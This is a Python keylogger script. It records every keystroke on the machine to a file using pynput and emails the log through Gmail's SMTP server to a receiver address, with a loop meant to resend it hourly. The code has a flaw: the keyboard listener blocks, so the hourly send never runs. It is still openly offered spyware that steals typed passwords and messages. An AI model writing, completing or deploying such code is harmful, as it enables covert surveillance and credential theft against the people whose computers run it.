#Imports and dependancies
from pynput.keyboard import Key, Listener
import logging
import datetime as dt
import smtplib
from email.message import EmailMessage

#Estabishing vars foreEmail
sender = "LOGSENDEREMAILEXAMPLE@gmail.com"
password = "ENTER PASSWORD OF SENDER EMAIL"
receiver = "LOGRECEIVEREMAILEXAMPLE@gmail.com"
open("keylogs.txt", "w")

#Crafting email
msg = EmailMessage()
msg['Subject'] = "Logs"
msg['From'] = sender
msg['To'] = receiver
msg.set_content('Most recent log below...')

#Creating attachment
with open("keylogs.txt", "rb") as f:
    file_data = f.read()
    file_name = f.name
msg.add_attachment(file_data, maintype="text", subtype="plain", filename=file_name)

#Establishing email
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(sender, password)
    smtp.send_message(msg)

#Establishing directory var
log_dir = ""

#Configuring log process
logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format=' %(message)s')

#Defining on_press function
def on_press(key):
    logging.info(str(key))

#Listeing for, and writing, keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()

#Starting 1 hour countdown until next email
t = dt.datetime.now()
while True:
    delta = dt.datetime.now()-t
    if delta.seconds > 3600:
        t = dt.datetime.now()

        #Recreating attachment
        with open("keylogs.txt", "rb") as f:
            file_data = f.read()
            file_name = f.name
        msg.add_attachment(file_data, maintype="text", subtype="plain", filename=file_name)

        #Reestablishing email
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(sender, password)
            smtp.send_message(msg)
